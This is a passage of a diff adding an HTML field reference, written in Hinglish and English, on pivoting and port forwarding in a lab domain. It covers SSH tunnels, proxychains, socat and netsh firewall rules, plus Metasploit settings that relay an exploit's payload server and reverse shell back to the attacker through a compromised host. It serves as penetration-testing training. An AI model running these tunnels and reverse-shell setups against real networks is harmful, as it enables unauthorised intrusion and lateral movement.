@@ -1,0 +1,1004 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Pivoting &amp; Port Forwarding — Field Reference</title>
+<style>
+  :root{
+    --bg:#0d1117; --bg-raised:#131a22; --bg-card:#1a2330;
+    --line:#22303c; --text:#d6e2ea; --text-dim:#7e94a3;
+    --accent:#5ee6c8; --accent-dim:#1e4a42; --warn:#e6b65e; --red:#e66a5e;
+    box-sizing:border-box;
+    padding-top:env(safe-area-inset-top,0px);
+    padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  html{ scroll-padding-top:env(safe-area-inset-top,0px); }
+  *{ box-sizing:inherit; margin:0; padding:0; }
+  @media(prefers-color-scheme:light){
+    :root:not([data-theme="dark"]){
+      --bg:#f2f5f7; --bg-raised:#ffffff; --bg-card:#e8edf0;
+      --line:#d0d8dd; --text:#1b2630; --text-dim:#55697a;
+      --accent:#0a8a72; --accent-dim:#c4ede4; --warn:#8a5e0a; --red:#c0392b;
+    }
+  }
+  :root[data-theme="dark"]{
+    --bg:#0d1117; --bg-raised:#131a22; --bg-card:#1a2330;
+    --line:#22303c; --text:#d6e2ea; --text-dim:#7e94a3;
+    --accent:#5ee6c8; --accent-dim:#1e4a42; --warn:#e6b65e; --red:#e66a5e;
+  }
+  body{
+    background:var(--bg); color:var(--text);
+    font-family:"SF Mono",ui-monospace,"Cascadia Code",Consolas,monospace;
+    line-height:1.6;
+  }
+
+  /* ── layout ── */
+  .wrap{ max-width:980px; margin:0 auto; padding:52px 24px 100px; }
+
+  /* ── header ── */
+  header{ margin-bottom:36px; }
+  .badge{ display:inline-block; background:var(--accent-dim); color:var(--accent); font-size:11px; padding:3px 9px; border-radius:3px; margin-bottom:12px; }
+  h1{ font-size:clamp(26px,4.5vw,38px); font-weight:700; letter-spacing:-0.01em; margin-bottom:10px; }
+  .sub{ color:var(--text-dim); font-size:14px; max-width:70ch; line-height:1.7; }
+
+  /* ── lab env ── */
+  .env{
+    margin:22px 0 36px;
+    background:var(--bg-raised); border:1px solid var(--line);
+    border-radius:8px; padding:16px 20px;
+    display:grid; grid-template-columns:repeat(auto-fit,minmax(180px,1fr));
+    gap:10px 24px; font-size:12.5px;
+  }
+  .env .row{ display:flex; flex-direction:column; gap:3px; }
+  .env .k{ color:var(--text-dim); font-size:11px; }
+  .env .v{ color:var(--accent); font-weight:600; }
+
+  /* ── toc ── */
+  nav.toc{
+    display:flex; flex-wrap:wrap; gap:8px;
+    padding-bottom:28px; margin-bottom:44px;
+    border-bottom:1px solid var(--line);
+  }
+  nav.toc a{
+    color:var(--text-dim); text-decoration:none; font-size:12px;
+    border:1px solid var(--line); padding:5px 12px; border-radius:4px;
+    transition:all .15s;
+  }
+  nav.toc a:hover{ color:var(--accent); border-color:var(--accent); }
+
+  /* ── sections ── */
+  section{ margin-bottom:60px; scroll-margin-top:24px; }
+  .sec-head{ display:flex; align-items:baseline; gap:12px; margin-bottom:8px; }
+  .sec-num{ color:var(--accent); font-size:13px; }
+  h2{ font-size:20px; font-weight:600; }
+  .sec-desc{ color:var(--text-dim); font-size:13.5px; max-width:72ch; margin:6px 0 24px; }
+
+  /* ── subsections ── */
+  .sub-sec{ margin-bottom:32px; }
+  h3{ font-size:15px; font-weight:600; color:var(--text); margin-bottom:6px; padding-left:2px; border-left:2px solid var(--accent); padding-left:10px; }
+  .how{ color:var(--text-dim); font-size:13px; margin:8px 0 12px; max-width:74ch; line-height:1.7; }
+
+  /* ── code block ── */
+  .code-block{
+    background:var(--bg-raised); border:1px solid var(--line);
+    border-radius:6px; overflow:hidden; margin-bottom:12px;
+  }
+  .code-label{
+    display:flex; align-items:center; justify-content:space-between;
+    padding:8px 14px; border-bottom:1px solid var(--line);
+    font-size:11px; color:var(--text-dim);
+  }
+  .code-label .machine{ color:var(--warn); }
+  pre{
+    padding:14px 16px; overflow-x:auto;
+    font-size:12.5px; line-height:1.65;
+  }
+  pre .c{ color:var(--accent); }   /* host/ip */
+  pre .w{ color:var(--warn); }    /* port/value */
+  pre .r{ color:var(--red); }     /* flag / keyword */
+  pre .d{ color:var(--text-dim); } /* comment */
+
+  /* ── flag table ── */
+  .flag-table{
+    width:100%; border-collapse:collapse;
+    font-size:12.5px; margin:10px 0 18px;
+    background:var(--bg-raised); border:1px solid var(--line); border-radius:6px; overflow:hidden;
+  }
+  .flag-table th{ padding:9px 14px; text-align:left; color:var(--text-dim); font-size:11px; border-bottom:1px solid var(--line); }
+  .flag-table td{ padding:9px 14px; border-bottom:1px solid var(--line); vertical-align:top; }
+  .flag-table tr:last-child td{ border-bottom:none; }
+  .flag-table .flag{ color:var(--warn); white-space:nowrap; }
+  .flag-table .fdesc{ color:var(--text-dim); }
+
+  /* ── diagram ── */
+  .diagram{
+    background:var(--bg-card); border:1px solid var(--line); border-radius:6px;
+    padding:16px 20px; margin:12px 0 20px;
+    font-size:12.5px; line-height:1.9; overflow-x:auto; white-space:pre;
+  }
+  .diagram .dc{ color:var(--text-dim); }
+  .diagram .ac{ color:var(--accent); }
+  .diagram .wc{ color:var(--warn); }
+
+  /* ── note/warning ── */
+  .note{
+    border-left:2px solid var(--warn); background:var(--bg-raised);
+    padding:10px 14px; font-size:12.5px; color:var(--text-dim);
+    border-radius:0 6px 6px 0; margin:12px 0;
+  }
+  .note b{ color:var(--warn); }
+
+  /* ── quick ref table ── */
+  .qref{
+    width:100%; border-collapse:collapse; font-size:13px;
+    background:var(--bg-raised); border:1px solid var(--line); border-radius:8px; overflow:hidden;
+  }
+  .qref th{ padding:10px 16px; text-align:left; color:var(--text-dim); font-size:11px; border-bottom:1px solid var(--line); }
+  .qref td{ padding:10px 16px; border-bottom:1px solid var(--line); vertical-align:top; }
+  .qref tr:last-child td{ border-bottom:none; }
+  .qref .tool{ color:var(--accent); font-weight:600; white-space:nowrap; }
+  .qref .adv{ color:var(--text-dim); font-size:12px; }
+
+  .overflow-x{ overflow-x:auto; width:100%; }
+
+  footer{
+    margin-top:60px; padding-top:18px; border-top:1px solid var(--line);
+    color:var(--text-dim); font-size:11.5px;
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header>
+    <div class="badge">field reference — illustrative lab only</div>
+    <h1>Pivoting &amp; Port Forwarding</h1>
+    <p class="sub">
+      Jab koi port firewall se block ho ya direct access na ho to pivot host (ek compromised machine) ko
+      jump box ki tarah use karke traffic forward karte hain. Yeh cheatsheet har technique ko detail mein
+      explain karta hai — kab use karein, kya karta hai, aur har flag ka matlab kya hai.
+    </p>
+
+    <div class="env">
+      <div class="row"><span class="k">ATTACKER BOX</span><span class="v">10.10.14.5</span></div>
+      <div class="row"><span class="k">PIVOT HOST</span><span class="v">PIVOT01 — 10.10.10.5</span></div>
+      <div class="row"><span class="k">TARGET A</span><span class="v">FILESRV01 — 10.10.10.6</span></div>
+      <div class="row"><span class="k">TARGET B</span><span class="v">DC01 — 10.10.10.7</span></div>
+      <div class="row"><span class="k">DOMAIN</span><span class="v">corp.redlab.local</span></div>
+      <div class="row"><span class="k">TUNNEL USER</span><span class="v">svc_tunnel</span></div>
+    </div>
+
+    <div class="env" style="grid-template-columns:1fr;">
+      <div class="row" style="gap:10px;">
+        <span class="k" style="font-size:12px;">DOWNLOADS — tools used in this reference</span>
+        <table class="qref" style="margin-top:6px;">
+          <tr><th>Tool</th><th>Download / Install</th><th>Platform</th><th>Notes</th></tr>
+          <tr>
+            <td class="tool">OpenSSH client/server</td>
+            <td class="adv"><code style="color:var(--accent)">apt install openssh-server</code> (Linux) · built into Windows 10/11 (Settings → Optional Features → OpenSSH Client/Server), or <a href="https://github.com/PowerShell/Win32-OpenSSH/releases" style="color:var(--accent);" target="_blank" rel="noopener">github.com/PowerShell/Win32-OpenSSH/releases</a></td>
+            <td class="adv">Win/Linux</td>
+            <td class="adv">No upload needed on modern systems</td>
+          </tr>
+          <tr>
+            <td class="tool">socat</td>
+            <td class="adv"><code style="color:var(--accent)">apt install socat</code> (Linux) · static Windows builds: <a href="https://github.com/3ndG4me/StaticBinaries/tree/master/socat" style="color:var(--accent);" target="_blank" rel="noopener">github.com/3ndG4me/StaticBinaries</a></td>
+            <td class="adv">Win/Linux</td>
+            <td class="adv">Windows needs a static binary uploaded</td>
+          </tr>
+          <tr>
+            <td class="tool">Chisel</td>
+            <td class="adv"><a href="https://github.com/jpillora/chisel/releases" style="color:var(--accent);" target="_blank" rel="noopener">github.com/jpillora/chisel/releases</a></td>
+            <td class="adv">Win/Linux/Mac (Go binary)</td>
+            <td class="adv">Pick matching OS/arch for both server and client</td>
+          </tr>
+          <tr>
+            <td class="tool">Ligolo-ng</td>
+            <td class="adv"><a href="https://github.com/nicocha30/ligolo-ng/releases" style="color:var(--accent);" target="_blank" rel="noopener">github.com/nicocha30/ligolo-ng/releases</a></td>
+            <td class="adv">Win/Linux (proxy + agent binaries)</td>
+            <td class="adv">Needs <code style="color:var(--accent)">wintun.dll</code> on Windows agent side — bundled in release zip</td>
+          </tr>
+          <tr>
+            <td class="tool">Plink (PuTTY)</td>
+            <td class="adv"><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" style="color:var(--accent);" target="_blank" rel="noopener">chiark.greenend.org.uk/~sgtatham/putty</a></td>
+            <td class="adv">Windows</td>
+            <td class="adv">Download the "plink.exe" standalone binary</td>
+          </tr>
+          <tr>
+            <td class="tool">proxychains</td>
+            <td class="adv"><code style="color:var(--accent)">apt install proxychains4</code> — already on Kali by default</td>
+            <td class="adv">Linux</td>
+            <td class="adv">Config at <code style="color:var(--accent)">/etc/proxychains4.conf</code></td>
+          </tr>
+          <tr>
+            <td class="tool">netsh</td>
+            <td class="adv">Built into Windows — no download</td>
+            <td class="adv">Windows</td>
+            <td class="adv">Requires the "IP Helper" service running</td>
+          </tr>
+        </table>
+      </div>
+    </div>
+  </header>
+
+  <nav class="toc">
+    <a href="#ssh-remote">SSH Remote Forward</a>
+    <a href="#ssh-local">SSH Local Forward</a>
+    <a href="#ssh-dynamic">SSH Dynamic / SOCKS</a>
+    <a href="#ssh-multi">SSH Multi-Forward</a>
+    <a href="#socat">socat</a>
+    <a href="#chisel">Chisel</a>
+    <a href="#ligolo">Ligolo-ng</a>
+    <a href="#plink">Plink</a>
+    <a href="#netsh">netsh portproxy</a>
+    <a href="#proxychains">proxychains</a>
+    <a href="#troubleshoot">Troubleshooting</a>
+    <a href="#ref">Quick Reference</a>
+  </nav>
+
+  <!-- ══════════════════════════════════════════
+       SECTION 1 — SSH
+  ═══════════════════════════════════════════ -->
+  <section id="ssh-setup">
+    <div class="sec-head"><span class="sec-num">01</span><h2>SSH Tunnelling — Setup</h2></div>
+    <p class="sec-desc">
+      OpenSSH ab Windows mein bhi by default aata hai, isliye yeh sabse common technique hai.
+      Idea: PIVOT01 SSH client ki tarah kaam karta hai aur attacker ka machine SSH server hai.
+      Attacker ki machine par ek restricted user banate hain jiske paas koi shell access nahi —
+      sirf tunnelling ke liye.
+    </p>
+
+    <div class="sub-sec">
+      <h3>Attacker box par restricted tunnel user banana</h3>
+      <p class="how">
+        <span style="color:var(--accent)">-s /bin/true</span> flag ensure karta hai ki yeh user SSH se connect hone ke baad
+        koi shell nahi chala sakta — sirf tunnel forward ho sakta hai. Yeh ek security measure hai.
+      </p>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX</span></div>
+        <pre>useradd svc_tunnel -m -d /home/svc_tunnel -s /bin/true
+passwd svc_tunnel          <span class="d"># strong, unique, throwaway password set karo</span></pre>
+      </div>
+      <div class="note"><b>Note:</b> Apna real password kabhi mat use karna is user ke liye — agar pivot host compromised hua to yeh password exposed ho jayega.</div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>⚠ Troubleshoot — Setup stage</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Problem</th><th>Fix</th></tr>
+          <tr><td class="flag">sshd not running</td><td class="fdesc"><code style="color:var(--accent)">systemctl status ssh</code> / <code style="color:var(--accent)">systemctl start ssh</code> on attacker box. On Windows pivot: <code style="color:var(--accent)">Get-Service sshd</code> then <code style="color:var(--accent)">Start-Service sshd</code>.</td></tr>
+          <tr><td class="flag">useradd: command not found</td><td class="fdesc">On minimal/non-Debian systems use <code style="color:var(--accent)">adduser</code> instead, or check you're root.</td></tr>
+          <tr><td class="flag">PIVOT01 can't reach attacker SSH at all</td><td class="fdesc">Confirm attacker's firewall allows inbound 22: <code style="color:var(--accent)">ufw allow 22/tcp</code>. Test with <code style="color:var(--accent)">nc -zv &lt;attacker-ip&gt; 22</code> from pivot first.</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── SSH Remote ── -->
+  <section id="ssh-remote">
+    <div class="sec-head"><span class="sec-num">02</span><h2>SSH — Remote Port Forwarding (-R)</h2></div>
+    <p class="sec-desc">
+      Pivot host (PIVOT01) ka koi reachable port attacker ki machine par "project" kar do.
+      Matlab: PIVOT01 ek machine (DC01) tak pahunch sakta hai jo attacker directly nahi touch kar sakta —
+      to PIVOT01 woh connection apni SSH tunnel se attacker tak forward kar deta hai.
+    </p>
+
+    <div class="sub-sec">
+      <h3>Flow diagram</h3>
+      <div class="diagram"><span class="dc">ATTACKER</span><span class="ac"> ←——————————————————————— </span><span class="wc">PIVOT01</span><span class="ac"> ————————→ </span><span class="dc">DC01:3389</span>
+<span class="dc">127.0.0.1:3389</span><span class="ac">     (SSH tunnel)       </span><span class="dc">10.10.10.7</span>
+<span class="d"># PIVOT01 apna access DC01 ka attacker tak le aata hai reverse SSH tunnel se</span></div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Command (PIVOT01 par chalao)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Windows/Linux)</span></div>
+        <pre>ssh svc_tunnel@<span class="c">10.10.14.5</span> -R <span class="w">3389</span>:<span class="c">10.10.10.7</span>:<span class="w">3389</span> <span class="r">-N</span>
+<span class="d">#      └── attacker IP   └── attacker par port   └── target IP:port</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Har flag ka matlab</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Flag</th><th>Matlab</th></tr>
+          <tr><td class="flag">-R 3389:10.10.10.7:3389</td><td class="fdesc">Remote forward. Attacker ke machine par port 3389 khulega. Us port par aane wala traffic PIVOT01 se through jaake DC01 ke port 3389 par jayega.</td></tr>
+          <tr><td class="flag">-N</td><td class="fdesc">No shell request. Sirf tunnel banao, koi interactive session mat kholo. Zaroori hai kyunki svc_tunnel user ke paas /bin/true shell hai.</td></tr>
+          <tr><td class="flag">svc_tunnel@10.10.14.5</td><td class="fdesc">Attacker machine par SSH server se connect ho raha hai is restricted user se.</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Ab attacker box se RDP connect karo</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX</span></div>
+        <pre>xfreerdp /v:<span class="c">127.0.0.1</span>:<span class="w">3389</span> /u:admin /p:P@ssw0rd
+<span class="d"># 127.0.0.1:3389 actually DC01 ka RDP hai tunnel ke through</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>⚠ Troubleshoot — Remote Forward (-R)</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Error / Symptom</th><th>Cause &amp; Fix</th></tr>
+          <tr><td class="flag">-R forward silently binds only to 127.0.0.1 on attacker</td><td class="fdesc">By default SSH servers only bind forwarded ports to localhost. Set <code style="color:var(--accent)">GatewayPorts yes</code> in <code style="color:var(--accent)">/etc/ssh/sshd_config</code> on the attacker box, then <code style="color:var(--accent)">systemctl restart ssh</code>, if you need the port reachable from other machines too.</td></tr>
+          <tr><td class="flag">channel 2: open failed: connect failed: Connection refused</td><td class="fdesc">PIVOT01 itself can't reach the final target:port. Test directly from PIVOT01 first: <code style="color:var(--accent)">Test-NetConnection 10.10.10.7 -Port 3389</code> (Windows) or <code style="color:var(--accent)">nc -zv 10.10.10.7 3389</code> (Linux).</td></tr>
+          <tr><td class="flag">remote port forwarding failed for listen port 3389</td><td class="fdesc">Port already bound on the attacker side. Check with <code style="color:var(--accent)">ss -tulpn | grep 3389</code> and either kill the conflicting process or pick a different forward port (e.g. <code style="color:var(--accent)">13389</code>).</td></tr>
+          <tr><td class="flag">Permission denied (publickey,password)</td><td class="fdesc">Confirm <code style="color:var(--accent)">PasswordAuthentication yes</code> is set in sshd_config if using a password, and that you're using the exact restricted username created earlier.</td></tr>
+          <tr><td class="flag">administratively prohibited: open failed</td><td class="fdesc">Set <code style="color:var(--accent)">AllowTcpForwarding yes</code> in <code style="color:var(--accent)">/etc/ssh/sshd_config</code> on the attacker box — some hardened configs disable this by default.</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── SSH Local ── -->
+  <section id="ssh-local">
+    <div class="sec-head"><span class="sec-num">03</span><h2>SSH — Local Port Forwarding (-L)</h2></div>
+    <p class="sec-desc">
+      Attacker machine ki koi service PIVOT01 par expose karo — taaki woh machines jo attacker tak
+      directly nahi pahunch sakti, PIVOT01 ke through attacker ki service use kar sakein.
+      Reverse shell receive karna ya malicious web server host karna iske common use cases hain.
+    </p>
+
+    <div class="sub-sec">
+      <h3>Flow diagram</h3>
+      <div class="diagram"><span class="dc">DC01 / FILESRV01</span><span class="ac"> ————→ </span><span class="wc">PIVOT01:80</span><span class="ac"> ——————→ </span><span class="dc">ATTACKER:80</span>
+<span class="d"># Internal machines attacker ki service tak PIVOT01 ke zariye pahunch sakti hain</span></div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Command (PIVOT01 par chalao)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Windows/Linux)</span></div>
+        <pre>ssh svc_tunnel@<span class="c">10.10.14.5</span> <span class="r">-L</span> <span class="w">*:80</span>:127.0.0.1:<span class="w">80</span> <span class="r">-N</span>
+<span class="d">#                              └── PIVOT01 par  └── attacker machine ka port</span>
+<span class="d">#                                  *:80 matlab sab interfaces par listen karo</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Har flag ka matlab</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Flag</th><th>Matlab</th></tr>
+          <tr><td class="flag">-L *:80:127.0.0.1:80</td><td class="fdesc">Local forward. PIVOT01 ke sab network interfaces par port 80 listen karega. Wahan aane wala traffic attacker machine ke localhost:80 par jayega. * matlab all interfaces (0.0.0.0) — sirf 127.0.0.1 doge to sirf PIVOT01 khud use kar sakta hai.</td></tr>
+          <tr><td class="flag">127.0.0.1:80</td><td class="fdesc">Attacker box ke perspective se — yeh attacker ka apna port 80 hai. 127.0.0.1 isliye kyunki attacker ki machine khud se connect karti hai.</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Windows mein firewall rule (agar zaroori ho)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Admin CMD)</span></div>
+        <pre>netsh advfirewall firewall add rule name="PivotPort80" dir=in action=allow protocol=TCP localport=80</pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>⚠ Troubleshoot — Local Forward (-L)</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Error / Symptom</th><th>Cause &amp; Fix</th></tr>
+          <tr><td class="flag">bind: Address already in use</td><td class="fdesc">Port 80 already taken on PIVOT01 (e.g. IIS running). Use a different listen port, e.g. <code style="color:var(--accent)">-L *:8080:127.0.0.1:80</code>.</td></tr>
+          <tr><td class="flag">Internal machines can connect to PIVOT01 but tunnel does nothing</td><td class="fdesc">Check Windows Firewall isn't blocking the listen port — add the <code style="color:var(--accent)">netsh advfirewall</code> rule shown above, and confirm you used <code style="color:var(--accent)">*:80</code> not <code style="color:var(--accent)">127.0.0.1:80</code> (the latter only listens for connections from PIVOT01 itself).</td></tr>
+          <tr><td class="flag">Attacker-side service not receiving anything</td><td class="fdesc">Confirm the service is actually listening on the attacker box: <code style="color:var(--accent)">ss -tulpn | grep :80</code>. If it's bound to a specific interface instead of 127.0.0.1/0.0.0.0, the tunnel can't reach it.</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── SSH Dynamic ── -->
+  <section id="ssh-dynamic">
+    <div class="sec-head"><span class="sec-num">04</span><h2>SSH — Dynamic Port Forwarding (SOCKS Proxy)</h2></div>
+    <p class="sec-desc">
+      Jab ek specific port nahi balki pura network scan/access karna ho to SOCKS proxy use karte hain.
+      Ek port forward ke jagah yeh ek dynamic tunnel banata hai jisse kisi bhi IP:Port par route kar sako.
+    </p>
+
+    <div class="sub-sec">
+      <h3>Reverse SOCKS (PIVOT01 se attacker tak — most common)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Windows/Linux)</span></div>
+        <pre>ssh svc_tunnel@<span class="c">10.10.14.5</span> <span class="r">-R 9050</span> <span class="r">-N</span>
+<span class="d"># Attacker ke machine par port 9050 par SOCKS proxy shuru ho jata hai</span>
+<span class="d"># PIVOT01 ke through sara traffic route ho sakta hai</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Normal SOCKS (jab attacker directly SSH kar sake pivot mein)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX</span></div>
+        <pre>ssh svc_tunnel@<span class="c">10.10.10.5</span> <span class="r">-D 9050</span> <span class="r">-N</span>
+<span class="d"># PIVOT01 par direct SSH access ho to yeh use karo</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>proxychains configure karo</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX — /etc/proxychains.conf</span></div>
+        <pre><span class="d"># File ke end mein [ProxyList] section update karo:</span>
+[ProxyList]
+socks4  127.0.0.1  <span class="w">9050</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Koi bhi tool SOCKS se chalao</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX</span></div>
+        <pre>proxychains curl http://internal.corp.redlab.local
+proxychains nmap -sT -Pn -p 445,3389,80 <span class="c">10.10.10.6</span>
+proxychains python3 exploit.py
+<span class="d"># nmap ke saath -sT (TCP connect) aur -Pn zaroori hai SOCKS se kaam karne ke liye</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>⚠ Troubleshoot — SOCKS / Dynamic Forward</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Error / Symptom</th><th>Cause &amp; Fix</th></tr>
+          <tr><td class="flag">proxychains: connect() timeout</td><td class="fdesc">The SOCKS tunnel itself may not be up — confirm with <code style="color:var(--accent)">ss -tulpn | grep 9050</code> that something is actually listening before blaming the target.</td></tr>
+          <tr><td class="flag">nmap gives empty/wrong results through proxychains</td><td class="fdesc">Always add <code style="color:var(--accent)">-sT -Pn</code> — SYN scans and ICMP ping probes don't work over SOCKS, only full TCP connect scans do.</td></tr>
+          <tr><td class="flag">proxychains hangs for a long time per host</td><td class="fdesc">Lower the timeouts in <code style="color:var(--accent)">/etc/proxychains4.conf</code>: <code style="color:var(--accent)">tcp_read_time_out 4000</code> and <code style="color:var(--accent)">tcp_connect_time_out 4000</code> (values in ms).</td></tr>
+          <tr><td class="flag">DNS names don't resolve through the tunnel</td><td class="fdesc">Add <code style="color:var(--accent)">proxy_dns</code> to proxychains4.conf so DNS lookups are also routed through SOCKS instead of resolving locally.</td></tr>
+        </table>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── SSH Multi ── -->
+  <section id="ssh-multi">
+    <div class="sec-head"><span class="sec-num">05</span><h2>SSH — Multiple Forwards (Complex Exploit Tunnelling)</h2></div>
+    <p class="sec-desc">
+      Kuch exploits ke liye ek saath kai ports forward karne padte hain — jaise Rejetto HFS exploit
+      jisme RPORT (target ka port), SRVPORT (attacker ka web server) aur LPORT (reverse shell) teeno
+      ko forward karna padta hai.
+    </p>
+
+    <div class="sub-sec">
+      <h3>3-way tunnel ek command mein</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Windows CMD)</span></div>
+        <pre>ssh svc_tunnel@<span class="c">10.10.14.5</span> <span class="r">-R</span> <span class="w">8888</span>:<span class="c">DC01.corp.redlab.local</span>:<span class="w">80</span> <span class="r">-L</span> *:<span class="w">6666</span>:127.0.0.1:<span class="w">6666</span> <span class="r">-L</span> *:<span class="w">7878</span>:127.0.0.1:<span class="w">7878</span> <span class="r">-N</span></pre>
+      </div>
+
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Flag</th><th>Purpose</th><th>Matlab</th></tr>
+          <tr><td class="flag">-R 8888:DC01:80</td><td>RPORT (target)</td><td class="fdesc">DC01 ka port 80 (vulnerable HFS) attacker ke port 8888 par forward. Attacker exploit ko 127.0.0.1:8888 par point karega.</td></tr>
+          <tr><td class="flag">-L *:6666:127.0.0.1:6666</td><td>SRVPORT (web server)</td><td class="fdesc">Attacker ka port 6666 (web server for payload) PIVOT01 ke port 6666 par expose. DC01 PIVOT01 tak pahunch sakta hai attacker tak nahi.</td></tr>
+          <tr><td class="flag">-L *:7878:127.0.0.1:7878</td><td>LPORT (reverse shell)</td><td class="fdesc">Attacker ka listener port 7878 PIVOT01 par expose. Reverse shell PIVOT01:7878 se aake SSH tunnel se attacker tak aata hai.</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Metasploit settings (iske baad)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX — msfconsole</span></div>
+        <pre>set rhosts 127.0.0.1       <span class="d"># DC01 ka tunnel attacker ke 8888 par hai</span>
+set rport 8888
+set srvhost 127.0.0.1      <span class="d"># web server attacker pe, tunnel se DC01 tak jayega</span>
+set srvport 6666
+set lhost PIVOT01.corp.redlab.local   <span class="d"># reverse shell PIVOT01 par connect karega</span>
+set ReverseListenerBindAddress 127.0.0.1  <span class="d"># listener attacker pe bind hoga</span>
+set lport 7878</pre>
+      </div>
+    </div>
+  </section>
+
+  <!-- ── SOCAT ── -->
+  <section id="socat">
+    <div class="sec-head"><span class="sec-num">06</span><h2>socat</h2></div>
+    <p class="sec-desc">
+      SSH available nahi hai ya simple single-port forward chahiye to socat best option hai.
+      Disadvantage: binary upload karna padta hai pivot host par, jo detection ka risk badhata hai.
+      Advantage: setup bahut simple hai, sirf ek command.
+    </p>
+
+    <div class="sub-sec">
+      <h3>Basic syntax samjho</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01</span></div>
+        <pre>socat <span class="r">TCP4-LISTEN</span>:<span class="w">PORT</span>,<span class="r">fork</span> <span class="r">TCP4</span>:<span class="c">TARGET_IP</span>:<span class="w">TARGET_PORT</span></pre>
+      </div>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Part</th><th>Matlab</th></tr>
+          <tr><td class="flag">TCP4-LISTEN:PORT</td><td class="fdesc">PIVOT01 par yeh port par listen karo — incoming connections accept karo.</td></tr>
+          <tr><td class="flag">fork</td><td class="fdesc">Har naye connection ke liye ek alag process fork karo — multiple connections handle ho sakein ek saath. Iske bina pehla connection close hote hi socat band ho jata hai.</td></tr>
+          <tr><td class="flag">TCP4:IP:PORT</td><td class="fdesc">Incoming traffic ko is IP aur port par forward karo.</td></tr>
+        </table>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>FILESRV01 ka RDP PIVOT01 ke through forward karna</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Windows CMD)</span></div>
+        <pre>C:\tools\socat\&gt; socat TCP4-LISTEN:<span class="w">13389</span>,fork TCP4:<span class="c">FILESRV01.corp.redlab.local</span>:<span class="w">3389</span>
+<span class="d"># Port 3389 already PIVOT01 ki apni RDP service le raha hai, isliye 13389 use karo</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Attacker box par web server PIVOT01 ke through expose karna</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Windows CMD)</span></div>
+        <pre>socat TCP4-LISTEN:<span class="w">80</span>,fork TCP4:<span class="c">10.10.14.5</span>:<span class="w">80</span>
+<span class="d"># Internal machines PIVOT01:80 par aayengi, jo traffic attacker:80 tak bhejega</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Firewall rule add karo (Windows, agar zaroori ho)</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">PIVOT01 (Admin CMD)</span></div>
+        <pre>netsh advfirewall firewall add rule name="Socat Pivot" dir=in action=allow protocol=TCP localport=13389</pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>Ab attacker se connect karo</h3>
+      <div class="code-block">
+        <div class="code-label"><span class="machine">ATTACKER BOX</span></div>
+        <pre>xfreerdp /v:<span class="c">PIVOT01.corp.redlab.local</span>:<span class="w">13389</span> /u:admin /p:P@ssw0rd
+<span class="d"># PIVOT01:13389 → socat → FILESRV01:3389</span></pre>
+      </div>
+    </div>
+
+    <div class="sub-sec">
+      <h3>⚠ Troubleshoot — socat</h3>
+      <div class="overflow-x">
+        <table class="flag-table">
+          <tr><th>Error / Symptom</th><th>Cause &amp; Fix</th></tr>
+          <tr><td class="flag">'socat' is not recognized as an internal or external command</td><td class="fdesc">Binary wasn't actually uploaded, or you're not in the right directory — use the full path, e.g. <code style="color:var(--accent)">C:\tools\socat\socat.exe</code>.</td></tr>
